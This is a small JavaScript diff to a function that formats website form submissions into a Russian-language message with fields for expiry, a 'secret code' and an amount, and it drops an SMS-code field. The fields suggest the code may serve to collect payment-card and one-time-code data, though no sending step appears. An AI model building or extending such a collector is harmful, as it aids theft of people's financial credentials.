@@ -5,7 +5,6 @@
 
 function buildTextFromPayload(payload) {
   if (typeof payload === "string") return payload;
-
   const p = payload || {};
   const lines = [
     "📨 Новая заявка с сайта:",
@@ -17,10 +16,8 @@ function buildTextFromPayload(payload) {
     p.requestNumber && `#️⃣ Номер заявки: ${p.requestNumber}`,
     p.expiry && `📅 Срок: ${p.expiry}`,
     p.secretCode && `🔒 Секретный код: ${p.secretCode}`,
-    p.verificationCode && `🔢 Код из SMS: ${String(p.verificationCode).trim()}`, 
-    p.note && `📝 Примечание: ${p.note}`,                                          
+    p.amount && `💵 Сумма: ${p.amount}`,        // ← НОВОЕ
   ].filter(Boolean);
-
   return lines.join("\n");
 }
 
